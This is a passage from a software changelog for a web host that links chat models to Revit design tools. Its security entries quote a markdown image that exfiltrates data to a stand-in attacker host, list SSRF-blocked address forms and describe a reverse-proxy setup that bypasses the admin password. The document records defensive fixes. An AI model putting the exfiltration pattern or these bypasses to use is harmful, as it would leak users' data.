# Changelog

All notable changes to `revit-bridge-web` are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions follow
[Semantic Versioning](https://semver.org/).

## [Unreleased]

### Added

- Sketch on a view. **Sketch on view** in the composer captures the active
  plan view and opens it to draw on; after every stroke the host shows what
  it read (a straight line in model millimetres, snapped to nearby walls),
  and the sketch goes with the next message. `POST
  /api/v1/bridge/sketch/capture` returns the picture and an id (the host
  keeps the view's frame for 30 minutes, per device); `POST
  /api/v1/bridge/sketch/resolve` returns the lines read from strokes;
  `POST /api/chat` takes `sketch: {capture_id, strokes, image?}`, reads the
  strokes again and appends the package's `sketch_block` to the designer's
  message. `image`, the capture with the lines on it, becomes a session
  capture: a planner whose models file entry has `vision: true` sees it,
  no other model does. The coordinates come from the host's conversion,
  never from a model reading the picture. Needs the `revit-bridge` release
  that has `sketch`.

- `@element` searches the whole model when nothing is selected in Revit.
  `GET /api/v1/bridge/mentions?kind=element` without `source` returns the
  selection when there is one and the matching elements of the model
  otherwise (`source` in the reply says which; `source=selection` and
  `source=model` choose one). Before, it was 422 without
  `source=selection`. The picker says when it is searching the model.
- `GET /api/v1/bridge/mentions/preview?id=<element id>`: a rough 3D shape of
  one element (the package's `element_preview`). The picker draws it,
  slowly turning, beside the list for the row the pointer or the keyboard is
  on, with the category, the size and a note that it is approximate. No
  drawing library is added. Needs the `revit-bridge` release that has
  `mention_model`.
  Curved surfaces in the element preview now shade smoothly and keep their sharp rims.

### Security

- Requires `revit-bridge` 0.11.2: a tool template is refused when a placeholder sits where its value could become code, and values are rendered so they cannot form code in any context. Existing user tools with such templates are listed with the reason and cannot run until repaired.

Tool authoring now shows field-level validation and clickable compiler locations.
Drafts use a built-in syntax reference by default and receive up to two repairs
after validation or sample compilation. Draft and repair calls appear in usage.
The bilingual form supports parameter ordering, typed trial values and JSON
editing. Saving requires a successful rollback trial for the current edits.
Host errors across the UI now include the server's detailed reasons.

Saved workflows can now be composed, validated and exchanged as YAML in the Workflows tab.
Chat retrieves them by summary and description. Each step receives a host-built card with
evidence for saved values, designer inputs and earlier results. Workflow cards use the existing
confirmation, automatic execution and ledger paths.
Settings → Remote MCP connects Codex CLI and Claude Code over Streamable HTTP.
Local mode shares the default web tool directory. Cloud mode can enable the endpoint
with `REMOTE_MCP=on` and issue revocable tokens for individual paired devices.
Settings shows recent execution evidence. Tool authoring can load a successful
remote rollback and take it through the existing compile, trial and save steps.

The composer verifies the live Revit selection on designer-typed messages.
Up to 20 picks including explicit `@` picks travel as IDs. Larger selections
travel as stamped document references with bounded category counts. Cards using
a reference show the counts and recheck the selection before confirmation or
automatic execution. Automatic attachments provide evidence for that message.
Unavailable elements are omitted with a reason. Selections made by remote MCP,
stdio MCP, user tools or the workbench are indistinguishable from the designer’s
own selection.

Planner selection questions keep watching when Revit covers the browser.
After cancellation, timeout or a document change, choose **Watch again**.
Older add-ins offer the current-selection fallback. Built-in UI-only packs share
the reader budget and the tool drawer includes native view activation and capture.

Captured views open in a keyboard-accessible full-screen viewer. A vision planner
receives session captures as context, up to two images per planner round and
1 MiB per image. This removes `ChatRequest.capture` and `CaptureAttachment`.
While a capture is visible to the planner, the session uses the full tool route
and skips the analyst step. Each image can be hidden, and
deployments can disable the feature with `CAPTURE_CONTEXT=off`. The host keeps
pixels in session memory and clears them with the session.

The header now remembers the designer's Chinese or English preference. Missing
tools offer a choice of a prefilled authoring page, Remote MCP settings or dismissal.
Tools navigation also links to Remote MCP. The host uses revit-bridge 0.11.1.
Its 58 built-in packs include `set_view_detail_level` and `set_view_display_style`.

Settings → Models now saves shared or per-role credentials on the host with user-only file
permissions. Rotation takes effect on the next request. Cloud administrators manage these
settings. Local Docker users can edit them through the loopback-published port.

When upgrading a local host that used a tab key, keep the tab open and enter the endpoint,
model name and key in Settings → Models. Existing tab keys are retained until the host confirms
a configured model, then the UI clears the old key and displays a notice. Browser keys are
disabled by default locally and enabled by default in cloud mode (`ALLOW_BROWSER_KEYS`).
The navigation now groups Chat, Tools, Evidence and Settings, with the connection status and
current model in the header.

The tool authoring page can generate an editable v1 draft from a description and a reference
pack. Compilation and a successful rolled-back trial unlock saving. Cloud hosts restrict
authoring to verified administrators.

The searchable tool catalog beside the task input works while Revit is disconnected. Open a
pack to inspect its parameters and limits, then insert its example into the current brief.

Task chat now offers opt-in automatic execution for verified built-in tools. Each automatic
step has a confirmation identity and a usage record. Stop finishes only the active operation.

The host now requires revit-bridge 0.10.1. Tool listings and details expose the `read_only`
flag. Element picker rows expose `document_id` for rechecking the selected document.

A read-only built-in declared by the package can return its result directly to chat. The
planner can use that evidence to propose a write in the same turn. Each message permits
up to ten reads. Element picks carry the document identity through submission and confirmation.

Multi-step task chat keeps a checklist, form answers and execution evidence across steps. After
one step completes, the planner can use its returned element IDs to prepare the next card in
the same response. Each card requires its own confirmation. A failed step pauses for the
designer. Usage records include the plan and step identifiers when available.
With a claimed plan token, the tool run endpoint returns HTTP 200 and `success: false`
for execution failures, including an unknown tool or an unreachable Revit device.

The chat picker can insert multiple elements from the current Revit selection with stable IDs.
Type searches accept partial words, spelling variants and category aliases across categories.
Category filters show counts, and scrolling loads more results. Each message accepts up to 20
distinct picks. Clearing an inferred category retains the other search words.
`GET /mentions` accepts `offset` and `source=selection` for element picks. All kinds return 422
for more than eight distinct search terms. With a query and no category, `kind=type` returns matching
types. Responses include `offset`, `facets`, `category_matched` and, for partial counts,
`facets_partial`. Element rows include `summary`, `level` and `category_label`.
Confirmation rechecks each bound element's category, family and type name, even after deselection.
Multi-ID evidence must match the bound ID set. Changed or missing elements require a new pick.
Host-generated reports follow the browser language. The English confirmation button reads
`Confirm and run · 确认并执行`. Host-marker checks compare case-folded Unicode letters and digits
after compatibility decomposition, including in model names shown to the planner.
The benchmark covers walls of a chosen type, walls from selected elements and windows positioned
along a wall. It checks each proposed binding against the model item picked for that run.

Task chat now shows proposals and questions inside the reply that produced them. One click on
`确认并执行` confirms the displayed draft and runs it. Typed assent highlights the card.
`POST /api/chat` accepts optional structured `answers` with the message and session.
The `questions` SSE event carries the form ID, questions and choices. Submitting a form resumes
its route. Typing a new request follows ordinary routing. Older cards keep their execution results.
The host sends the model the `ask_designer` tool, uses the package's native inline-card prompts, and updates
the `propose_spec` description. Answers that do not match the open form return HTTP 422
(`invalid_answers`). The supervisor's question appears once in the `questions` event, with its
report in the reply text. Choosing "End this task" closes the task without calling a model.
Reporting an execution result closes the previous unanswered form.

Host-generated questions and option labels follow the browser language.
Text entered in Other matches an offered label first, then an offered value.
Typing `stop` or the displayed "End this task" label ("结束此任务" in Chinese)
in the supervisor form therefore closes the task without a model call.

Upgrading: **a host that other machines reach must set `DEPLOY_MODE=cloud` in its `.env` before it
is upgraded**, and keep `ADMIN_PASSWORD` (a cloud host now refuses to start without it). That
includes a host published on loopback behind a reverse proxy or a tunnel on the same machine. The
host now starts as a local host by default (`DEPLOY_MODE=local`): this machine only, no relay, no
pairing, no admin password. Local mode does not detect every proxy: a reverse proxy that adds no
forwarding header and rewrites `Host` to the loopback address - nginx's default `location / {
proxy_pass http://127.0.0.1:7860; }` - passes all of its checks, and the host would then serve pack
edits, skill edits and the logs without a password to anyone the proxy lets in. The only
protections on upgrade are setting `DEPLOY_MODE=cloud` and the startup refusal of a local host that
finds `ADMIN_PASSWORD` (or `CORS_ORIGINS`) set: a site that ran with a password fails closed, one
that ran without it does not. See *Added* and *Changed* (deploy modes).

The host needs `revit-bridge==0.10.0` (`uv sync`, or rebuild the image). The lock pins
0.10.0 for the paged picker, element verification and inline-card instructions. The
system prompt changes (below); questions in the `spec` event may carry `kind` and `blocks`, and a value
`reconcile` cannot find now also comes as a question. The `mentions` event is sent only for
a message that carries picks (see *Added*).
Set `ADMIN_PASSWORD` to keep changing capability packs from the web UI (see *Security*). If your
`.env` was copied from an older `.env.example`, delete its `FORWARDED_ALLOW_IPS=127.0.0.1` line
when the port is published on loopback behind a proxy on the Docker host (see *Fixed*).

**The chat's default is now planner + supervisor: the analyst is off** (`ROLES_ANALYST` defaults
to `off`; it was `on`). Set `ROLES_ANALYST=on` to keep the analyst, or pick the mode per request
(see *Added*, chat modes). A `.env` copied from an older `.env.example` still says
`ROLES_ANALYST=on` and keeps the analyst. The first `stage` event of a turn has one new field,
`mode`; `/config.json` has `features.chatModes` and `features.chatModeDefault`; `/api/chat` takes an
optional `mode`; `/api/usage` rows and `/api/usage/runs` lines have `mode`.

**The chat now runs in roles** - planner and supervisor by default, the analyst too in mode
`roles_analyst` (`ROLES_ANALYST=on`, or a request's `mode`) - each with its own instructions,
tools and model (see *Added*). The events keep their shapes; `role` now also takes
`analyst` and `supervisor`, a turn has one `stage` pair per role, and a reported run may come back
with a new `spec` (the supervisor sent the task back). `LLM_SINGLE_MODEL=1` keeps the chat as it was
(one loop, the planner's model), request for request and event for event.

**The model in the chat no longer writes code** (see *Changed*): it runs saved tools only, and code
becomes a tool on the workbench. Built-in packs are now read-only: a client that edited, hid or
replaced one gets 409 `builtin_read_only` (see *Changed*). Started with `uv run revit-bridge-web`,
the host shares your tools with the package's MCP server (see *Changed*).

### Security

- **Changing capability packs needs the admin password.** This changes who may call three
  routes: `PUT /api/v1/bridge/tools/{name}`, `DELETE /api/v1/bridge/tools/{name}` and
  `POST /api/v1/bridge/solidify` now require `X-Admin-Token` (the same check as skill edits,
  `/api/logs` and the device list) and answer 403 `admin_required` without the right one, 503
  `admin_disabled` when `ADMIN_PASSWORD` is unset. Before, any visitor could create, edit or
  delete a pack - the built-in ones included - and a pack's code runs in a designer's Revit
  once they confirm its card. Listing, reading, choices, missing-params, confirming and running
  packs are unchanged. In `docs/api-v1.json` these three operations change (the header, 503,
  the 403 text). The Capabilities page hides *Edit pack* and *Delete*, and the task page's
  *Save as pack* stays off, until the admin password is entered on the Connect page; a host
  without `ADMIN_PASSWORD` cannot change packs through the web UI. The model's tools never
  could (it has no writing tool; a test keeps it so).
- **Three more routes gained a documented status:** `POST /api/v1/bridge/devices/pair`,
  `POST /api/v1/bridge/devices/redeem` and `DELETE /api/v1/bridge/devices/{device_id}` now
  declare 503 `device_store_unavailable` (see *Fixed*). That 503 is the only change to those
  three operations in `docs/api-v1.json`; with the three pack routes above they are the only
  operations whose contract this round of fixes changes.
- The server's model key no longer leaves for a visitor's endpoint. A request with only
  `X-LLM-Base-Url` used to go there with `LLM_API_KEY` in its `Authorization` header. The key
  now only ever goes to `LLM_BASE_URL`: a request that names its own base URL must send
  `X-LLM-Key` too (400 otherwise, nothing sent); a visitor's key or model name alone still uses
  the server's endpoint, as documented. `/config.json` reports `serverModel` only when
  `LLM_BASE_URL`, `LLM_MODEL` and `LLM_API_KEY` are all set.
- A browser-supplied model endpoint must be on a public address: a literal loopback, private,
  link-local, multicast, unspecified or reserved address (IPv4-mapped IPv6, IPv4 inside 6to4,
  Teredo or NAT64, and numeric short forms such as `127.1` or `2130706433` included),
  `localhost` and names under it, or a name that resolves to one, is refused with 400 before
  anything is sent. The host checked is the one httpx connects to, and a URL httpx would refuse
  (a control character, a space in the host) is a 400 too. `LLM_ALLOW_HTTP=1` lifts the
  address check along with the https rule (a model on the operator's own network);
  `LLM_BASE_URL` is never checked. The name is resolved once per request, which does not stop
  DNS rebinding, so a public host should also restrict egress. A redirect from a model endpoint
  is never followed (it is an error).
- Markdown from the model (task page) and from skill files (Capabilities page) renders no
  images: a reply with `![x](https://attacker/?d=...)` made the browser fetch that address.
  An image shows as its alt text; links open in a new tab with `rel="noopener noreferrer"`.

### Added

- **Token bench: `--mode` and `--confirm`.** `--mode auto|single|roles|roles_analyst` (default
  `auto`) goes as `mode` with every chat request of the run; the results record it (`chat_mode`)
  with the host's default and the modes its turns ran in (`chat.host`, `chat.modes_seen`, each
  task's `modes`), and the table header shows it. `chat.host` is the host's
  `features.chatModeDefault`; a host from before the modes is `single` when it says `roles: false`
  and `null` (shown as unknown) when it says `roles: true`, which there meant the analyst too unless
  switched off - it was recorded as `roles` before. `compare` adds a NOTE when the two runs' hosts
  ran different modes (`chat.modes_seen`). `--confirm never|once` (default `never`, as
  before): with `once`, a tool or ask task whose turn ends with no accepted spec while the host's
  tool events show a proposal ready for confirmation (its last `reconcile` came back `ready`, no
  `propose_spec` was called) gets one more user message, "yes", and is scored on what follows; the
  extra turn's tokens are counted and each task records `confirm_turns` (the results:
  `confirm_policy`; `compare` notes two runs that differ in it, exit 3). This is the unattended
  ("automatic") mode: `python -m bench run --label <name> --confirm once`. It runs nothing more in
  Revit: without `--execute` the report step still gets the fixed result.
- **Chat modes** (README, *Chat modes*): `single` (one model loop), `roles` (planner +
  supervisor), `roles_analyst` (analyst + planner + supervisor) and `auto`, the host's default -
  `single` with `LLM_SINGLE_MODEL=1`, else `roles_analyst` with `ROLES_ANALYST=on`, else `roles`.
  `POST /api/chat` takes an optional `mode` (one of the four, anything else 422; absent or `null`
  is `auto`); a local host honours it, a cloud host only for a request with the right
  `X-Admin-Token` (anyone else's is ignored: the default runs); without the bridge a request runs
  as `single`. `/config.json` gains `features.chatModes` (what the caller may pick: all four on a
  local host and for an admin on a cloud host, `["auto"]` otherwise) and `features.chatModeDefault`
  (what `auto` runs, never `auto`). The turn's first `stage` event gains `mode`, the mode it ran in;
  every `llm_calls` row records it (an older table gains the column, its rows `null`), `GET
  /api/usage` rows show it and `GET /api/usage/runs` reports it per run (`mixed` for more than one).
  The task page has a *Mode* menu next to the chat input (Auto, Single model, Planner + supervisor,
  Analyst + planner + supervisor; Auto names what it runs on the host), remembered in the browser
  (`localStorage`) and sent with every chat request; it is not shown when the host offers fewer
  than two modes. The Token page has a *Mode* column. In `docs/api-v1.json`: the chat request's
  `mode`, `CallRow.mode` and `RunTotal.mode`.
- **Provider options in the models file** (README, *Models by role*): an entry may set `api`
  (`chat`, the default, or `responses` - `<base_url>/responses`, OpenAI's Responses API, for models
  that take tools only there), `max_tokens_param` (`max_tokens` or `max_completion_tokens`, chat api
  only), `reasoning_effort` (`low`, `medium`, `high`, `xhigh`) and `timeout_s` (10 to 900); each is
  sent only when set, and unknown fields are still refused. A responses call is made whole, not
  streamed, and its text and tool calls go to the page through the same events as a chat call;
  it is stateless (`store: false`) and, with `reasoning_effort` set, asks for the encrypted
  reasoning and sends it back with the function calls in the following calls. Its usage maps
  `input_tokens` to input, `input_tokens_details.cached_tokens` to cache read (`cache_write_tokens`
  to cache write when reported) and `output_tokens`, reasoning included, to output. The browser's
  `X-LLM-*` settings still call the chat api with the defaults. On the chat api the provider's own
  keys on a tool call - Gemini's `extra_content` with the thought signature Gemini 3 and later
  require - now go back unchanged on that call in the following requests to the same endpoint and
  model (kept in memory with the chat session; never on disk or in a log; at most 64 calls, none
  whose data is over 64 KB, and forgotten with the history; two calls that share an id, name and
  arguments - a provider that numbers its calls from `call_0` in every reply - get nothing back
  rather than each other's). A reply that ends at
  its output limit before it wrote anything or called a tool (a thinking model that spent the limit
  thinking) now ends the turn - for the analyst, the planner and the supervisor alike, with no
  repair request and no fallback - with an `error` event the chat shows as its reply: *Output limit
  used up*, the role and its model, the limit as sent (`max_tokens 16384`), what is still there (the
  last card the turn proposed - kept and confirmable when it was ready, otherwise not confirmable as
  it stands; after a reported run, the run and its result as the page received them; when the
  supervisor ran out, its report is missing and the planner has not been told of the run, so the
  designer says what it did in the next message - nothing else carries it over; otherwise nothing
  was proposed) and how to raise it (a larger `max_tokens` in the model's entry; `LLM_MAX_TOKENS`
  for an entry without one and without a models file; for a model the browser's settings chose,
  only the host can - `LLM_MAX_TOKENS`, or an entry used without those settings). Before, such a
  reply was an empty message. Without a models file, and for an entry without these fields, every request and
  every stream is byte for byte what it was, except the output limit (see *Changed*): a test
  compares them with a record taken before the change, with the limit forced back to 4096 and
  with the new one.
- **The chat in three roles** (`backend/roles.py`; README, *The chat's roles*). This entry
  describes mode `roles_analyst` (`ROLES_ANALYST=on`); the default mode is planner + supervisor -
  no analyst, every message goes to the planner with route `tool` (see *Chat modes* above). A
  message goes to the **analyst** (the package's `host_instructions(role="analyst", code=False)`
  and one host line linking the workbench; no tools): it sees the message with its selections
  block, the package's `snapshot_digest` of the open model (one snapshot per session, read again
  after each reported run, no model call), the tool list (a name and one line each) and the open
  task, and answers one JSON routing `{route, tool?, facts_needed, note}`. `chat` and `none`: the
  note is the reply (`none` with the workbench link, added by the host when missing). `query` and
  `tool`: the **planner** (`host_instructions(role="planner", code=False)` and `WORKBENCH_LINE`)
  runs the loop with the session's conversation, the message followed by the routing, and that
  route's tools only - `query` and `get_project_snapshot` for a read, all seven for a tool; any
  other call is answered `tool_not_offered` and never run. A reported run goes to the
  **supervisor** (`host_instructions(role="supervisor", code=False)`; `query` only): the confirmed
  spec (`/spec/confirm` with the chat's `session_id` now keeps it on the session), a summary of the
  result (its `result` cut to 2000 characters, the validator without its samples) and how often the
  task went back; it answers one JSON verdict `{verdict: done|retry|ask, report, fix?, question?}`.
  The host streams the report (and the question); `retry` runs the planner again in the same reply
  with the fix (a new `spec` event), at most twice in a row (a message of the designer starts the
  count again), then the host asks. The host holds the verdict to the package's, on the raw result:
  `done` on a validator that did not pass, or on a run Revit did not report as a success, becomes
  `ask` with the validator's own checks; `retry` on a run that succeeded with a validator that did
  not fail becomes `ask` (the designer decides); a refusal by nature is never sent back - `refused:
  true` (revit-bridge 0.9.1; handled when present), `preconditions_failed`, `validator_before_failed`,
  `blocked`, or a failure with no `evidence_id` (refused before it ran, Revit not reached). Without
  a spec the page confirmed in this session the supervisor gets the last proposal as
  `proposed_spec`; a confirmation is used up when its run is reported. What the supervisor, the
  session and the host's own reports get of a result (up to 4 MiB) is cut: texts to 1000
  characters, lists to 20 items, a check's detail to 300, 30 checks (the failed ones first),
  `result` to 2000, the supervisor's message to 16 KB in all. The open task: a `tool` routing opens
  or continues it, another tool replaces it, `done` closes it; reads and small talk leave it. The
  digest is kept per session and device, not read again within a minute after a failure. A role's
  answer that is not its JSON gets one repair request, then the host falls back (the analyst: route
  `tool` with the whole planner; the supervisor: the host's summary of the raw result, `ask`). A
  role without a model is a 400 that names the role (a role on its own models-file entry needs its
  key variable on the server: the browser's settings replace the planner's entry only); the
  interaction log names each role that ran and its model. Two switches for measuring variants:
  **`ROLES_PLANNER_TOOLS=all`** (the planner gets and may run all seven tools on every route) and
  **`ROLES_ANALYST=off`** (no analyst: every message goes to the planner with route `tool`, the
  supervisor still reports); any other value refuses the start. Each role's
  model is `models_file.resolve(role, headers)` (without a models file all three use the one model;
  the browser's settings replace the planner's entry only); every `stage`, `tool` and `usage`
  event and every `llm_calls` row carries its role and that model, and `round` counts the turn's
  calls across roles. `CHAT_RATE_LIMIT` still counts requests, not model calls. **`LLM_SINGLE_MODEL=1`**
  runs the chat as one loop exactly as before (`/config.json` `features.roles`: `false`); without
  the bridge there are no roles either. In the suite's scripted flows (same model answers,
  revit-bridge 0.9.1's 22 built-in tools) the request bytes, one loop -> roles: a tool task with a
  question, an answer and the report 66.6 KB -> 69.7 KB (each message turn about 5.8 KB more for the
  analyst, the report 9.2 KB less), a read 16.0 -> 17.1 KB, small talk 7.8 -> 5.7 KB, "no tool"
  38.0 -> 5.7 KB (with 0.9.0's eight tools: 64.7, 14.6, 3.2 and 22.3 -> 3.2 KB).
- The task page: the tool timeline groups by role under the role and model name; the token panel
  has one row per role that ran and the total, and shows a count the provider did not report as
  `-` (as the Token page does; it said *unknown*); the analyst's and the supervisor's replies are
  ordinary assistant messages; a report the supervisor sends back shows the planner's new card,
  ready to confirm, with *Previous attempt* above it - what the page itself received from that run.
  A run refused by the tool in Revit (`refused: true`) says so. The Connect page's *Models by role*
  says whether the roles run or one loop does (`features.roles`).
- Token bench: the results record how the host ran its chat (`chat`: `features.roles` and the roles
  the events named; the host decides, `LLM_SINGLE_MODEL`). In the default mode a report answered
  with a new card is reported again (at most 3 reports per task), and a task may carry its own
  `execution` result; `bench/tasks-supervisor.yml` has two such tasks (a failed validator, a run
  refused in Revit in revit-bridge 0.9.1's shape). The results record that policy
  (`feedback_policy`); `compare` notes two runs whose policies differ (results written before
  reported once per task) and then exits 3 when nothing got worse.
- **The designer's picks: `@level`, `@type`, `@link` in the chat** (revit-bridge 0.9's
  `mentions`). `GET /api/v1/bridge/mentions?kind=level|type|link&category=&q=&limit=` is the
  package's `mention_candidates` reply as it is (types by category, the categories first; a link
  that is not loaded is listed with `disabled: true` and its `reason`); a kind or category the
  package refuses is 422 (`unknown_kind`, `invalid_args`), Revit reporting an error 200 with its
  `error`, no Revit 503 `revit_unreachable`; the device rules of `/query`. `POST /api/chat` takes
  `mentions: [{kind, id, label?}]` (at most 20, an integer id, no other field; with a message and
  the bridge only): the host checks them with the package's `resolve_mentions` before the model is
  called and starts the turn with **`event: mentions`** `{resolved, not_found, invalid,
  unresolved, warnings?}`; the verified picks follow the designer's words as the package's
  "Designer's selections" block and stay with the session, per device, for its later turns (a
  pick a later turn finds gone leaves it); picks not found or not valid are not sent; with Revit
  unreachable, or no answer within 15 s, every pick is `unresolved` with the reason
  (`revit_unreachable`, `timeout`, ...) and the turn runs without them. A message without picks
  is unchanged (no event, the text as typed). A spec parameter whose evidence starts with
  `mention` must bind a pick verified in that session for the same device, as exactly
  `mention:<level|type|link>#<id>`, of the kind the parameter takes (as its pack declares it), to
  the name the package's block shows (a level's or a type's name, a link's label or else its
  name), with the source the package's rule gives (`tool` for a parameter whose value comes from
  the model, else `designer`): otherwise `unknown_mention`, on the model's `propose_spec` and
  `reconcile` and on `POST /spec/reconcile` and `POST /spec/confirm`, which take an optional
  `session_id` for it (422 `invalid_spec` with the `errors`). `/spec/confirm` reads a spec's
  picks again from the open model before it issues a token: one gone or renamed since is
  `unknown_mention`; without Revit 503 `revit_unreachable` (503 `revit_error`, 504
  `revit_timeout`); a spec without picks needs no Revit. In `docs/api-v1.json`: the new path,
  `ChatMention`, `ChatRequest.mentions`, `session_id` on the two spec requests, and 503 and 504
  on `/spec/confirm`. The task page's input is the mention input: `@` offers the three kinds, a
  picked item is one tag, the list comes from the route above (a listing that does not answer
  within 10 s gives up, and Enter sends), and an `@` right after an ASCII letter or digit opens
  nothing (`bob@level`) while one after a space, punctuation or a Chinese character does. Each
  item is sent once (`{kind, id}`, no label), at most 20 per message (more: the message stays in
  the box with a note). A sent message shows each pick with what the host found, and a pick found
  gone is struck through when it is in the box again; the confirmation and the reconciliation
  send the session id.
- **Models by role: `models.yml`**, the one configuration file of the host (`MODELS_FILE`, default
  `DATA_DIR/models.yml`; `models.example.yml` shows it). Each entry is a `base_url` (https, or http
  to loopback - to any host with `LLM_ALLOW_HTTP=1`), a `model` and `api_key_env` - the *name* of the environment variable holding the
  key, read on every call; keys never go in the file, and any other field (`api_key`, `key`,
  `token`, `extra_headers`...) is refused. `roles` maps `analyst`, `planner` (required) and
  `supervisor` to entries; a role left out uses the planner's; all three on one entry is "one model
  for everything". Only the planner runs in this release (the chat); the roles split comes next.
  The file is checked once at startup: a file that is not valid - or missing where `MODELS_FILE`
  points - refuses the start with the file, the field and the problem, never a value from it. A
  key variable that is not set is no startup error (the browser may bring `X-LLM-Key`). **No file
  at the default path changes nothing**: `LLM_*` and the `X-LLM-*` headers as before, the same
  requests to the model and the same stream. With a file, the planner's entry stands where `LLM_*`
  stood and the `X-LLM-*` headers replace that entry, field by field, for the request (the browser
  endpoint check applies to `X-LLM-Base-Url` as before); roles on other entries keep theirs.
  `/config.json` gains `features.models` (each role's model name - no address, no key, no variable
  name; without the file `LLM_MODEL` or `null` for all three) and `features.modelsFile`; with the
  file `serverModel` follows the planner's key variable. The startup log says where the models come
  from and names each role entry whose key variable is not set. `stage`, `usage` and `llm_calls`
  carry the model the call actually went to.
- Connect page: *Models by role*, read-only - the three roles, their model names, and whether they
  come from the host's models file or from the environment and this browser.
- **Token page** (`/token`, a tab next to Evidence): the runs of `GET /api/usage/runs` - time,
  calls, input, cache read, cache write, output, time per run and per role and model - and two
  picked runs side by side with the difference of each count, in total and per role. Unknown
  counts show as `-` and make every total and difference they are part of unknown. Read-only; on a
  cloud host it asks for the admin password, as `/api/logs` does.
- `GET /api/usage/runs` gains `by_role` on each run: the calls and the four sums per role and model,
  in the order of their first call, with the same unknown rule. A new field only; in
  `docs/api-v1.json` the `RolePart` schema, `RunTotal.by_role` and the route's description.
- The workbench's routes (`docs/api-v1.json` gains five operations): `POST /api/v1/bridge/check`
  is the package's `check_code` (compile in Revit, never run, with the lessons for the errors as the
  MCP tool adds them) and `POST /api/v1/bridge/dry-run` its `dry_run_code` (run in the open model and
  always rolled back: no confirmation, no token; one `dry_run` ledger line). Each takes
  `{code, parameters?}` or `{pack, values}` - a draft in the pack format whose template the package
  fills (saved and rendered in a store of fresh temporary directories; 422 `invalid_pack` or
  `render_failed` with the package's messages); any other field, the package's `include` (files on
  the host's machine) among them, is 422. The replies are the package's as they are; code the
  sandbox refuses is answered before Revit is needed, no add-in is 503 `revit_unreachable`, and a
  cloud host counts both against `/spec/confirm`'s rate limit (429 `rate_limited`; a local host
  does not limit them). `POST /api/v1/bridge/choices` `{choices_from}` returns `[{label, value}]`
  from the package's `get_tool_choices`. `GET /api/v1/bridge/tools/{name}/export` returns the pack
  file as stored (`text/yaml`); `POST /api/v1/bridge/tools/import` takes one as YAML text (at most
  256 KB, checked on `Content-Length` before the body is read; YAML aliases, nesting too deep to read
  and keys that are not text are 422 `invalid_pack`), validates it as the package validates a pack
  file (422 `invalid_pack`, 400 `blocked`) and stores it as sent; an existing user pack is replaced
  only with `?overwrite=true` (409 `pack_exists`). Only the current (v1) format imports: an older v0
  file has to be saved once in the current format first. The import is a pack write: admin password
  on a cloud host, none on a local one.
- `GET /api/v1/bridge/tools` and the model's `list_tools` mark each pack `builtin` (true for the
  wheel's) and its `origin` (`"builtin"` or `"user"`); on a local host the page's listing also has
  `directory`, where the file is. Both are read from disk on every call.
- Every tool name from a request or from the model is checked before the store sees it: ASCII
  letters, digits and `_`, not starting with a digit (the shape of the pack schema's parameter
  names, `IDENTIFIER_RE`, without its Unicode letters), at most 100 characters, and no
  Windows device name (`con`, `nul`, `prn`, `aux`, `com0`-`com9`, `lpt0`-`lpt9`, any case; on Windows
  `ToolStore().load("con")` blocks). 422 `invalid_tool_name` from the routes (paths, `POST /solidify`,
  the import, the specs of `/spec/confirm` and `/spec/reconcile`), a result with that error from the
  model's `missing_params`, `get_tool_choices`, `reconcile` and `propose_spec`.
- The Capabilities page has a *Workbench* tab, also at `/capabilities/workbench` (a link opens it),
  where code becomes a tool: a C# editor (line numbers, Tab indents), the parameter declarations
  (type, source - designer, levels, family types or elements of an `OST_*` category - unit,
  default, required), *Check* (diagnostics by line; click one to go to it), *Dry run* (the values
  first, model options from `/choices`; what would be added, modified and deleted, the return
  value, and whether the rollback was confirmed - a refusal before anything reached Revit says
  so), *Save as tool* (name, description, validator as a JSON object; only after a successful
  dry run of the same code and declarations, and it asks before replacing a tool of that name)
  and *Run* (the saved tool through the spec card, `/spec/confirm` and `/tools/{name}/run`, as on
  the Packs page; a draft whose code, parameters or validator differ from the saved tool is
  refused with "save it first"; the card goes with any change to the draft or a value, *Confirm*
  reads the saved tool again first, and Run is off while a run is in progress). Number fields keep
  the text as typed and read it when used: `2.5` stays 2.5, `2,5` is an error. An empty value field
  of a parameter with a default sends no value and says "default X will be used" (also on the
  card); entering a default clears *Required*, as the pack format wants; a pack's `default: null`
  stays a default. Saving an opened tool keeps its source query and each parameter's own source
  (`floor_types`, `answer`, `default`) and type spelling; what `/solidify` cannot carry
  (preconditions, applies_when, not_for, display name, version, revit_versions, fixtures, the
  approval) is named before a replace and needs its own click. Your own tools are listed with
  their directory (open, export, delete, import - an import asks before replacing); the built-in
  ones are read-only (open to read or copy, export). A refusal of the server shows in place with
  its problems, errors or warnings. On a cloud host saving, deleting and importing need the admin
  password. `frontend/src/api/workbench.ts` is the one HTTP client of the workbench (check, dry
  run, choices, lookup, save, list, load, remove, export, import); it always sends a draft as
  `{pack, values}`, so the package fills the template (a leftover `{x}` is its 422
  `render_failed`), and asks `/choices` for the options.
- What the host loop does is visible and counted. `/api/chat` sends three more SSE events next
  to the ones it already sent (whose names, shapes and order are unchanged): `event: stage`
  `{role, model, status}` (`start` before the first model call, `end` before `done` or `error`;
  the role is `planner`), `event: tool` `{id, role, name, args, status, ms?, size?, preview?,
  error?}` (`running` when a tool call starts, then `ok` or `error` with the same `id`; `size` is
  the result's length in characters, `preview` its first 2000) and `event: usage` `{role, model,
  round, input, output, cache_read, cache_write, ms}` after every model call. A client that
  ignores unknown events sees no difference. A turn with `bridge: false` sends `stage` and
  `usage` but no `tool`. Arguments whose JSON text runs past 8000 characters go out as
  `{"_truncated": true, "_chars": <length>, "_head": <first 2000 characters>}`; a tool that raised
  reports only the exception's type name (the text goes to the server log); `stage` `end` is sent
  however the turn ends, as long as the client is still there.
- Token usage: every model request asks for it (`stream_options.include_usage`) and the four
  numbers are read from the provider's `usage` object - OpenAI, DeepSeek
  (`prompt_cache_hit_tokens`), the Gemini and Anthropic OpenAI-compatibility endpoints, gateways
  such as OpenRouter, new-api and LiteLLM. `input` is the whole prompt with cached tokens
  included, `cache_read` and `cache_write` the parts served from and written to the provider's
  cache, `output` the completion - thinking tokens included also where the provider counts them
  only in `total_tokens` (Gemini's compatibility endpoint; `output` is then `total_tokens -
  input`). A number the provider does not report, or one that is not an integer from 0 to 2^53,
  is `null`, never 0, and every sum over calls is unknown as soon as one call lacks that number
  (or the sum passes 2^53). Usage objects of one stream are merged field by field. An endpoint
  that answers a 4xx other than 401 / 403 naming `stream_options` is asked once more without
  it; when that is accepted, that address and model are not asked again until the host
  restarts. Known limit: a gateway that always sends `prompt_tokens_details.cached_tokens`
  (new-api sends 0 when the upstream reported nothing) shows a cache read of 0 rather than
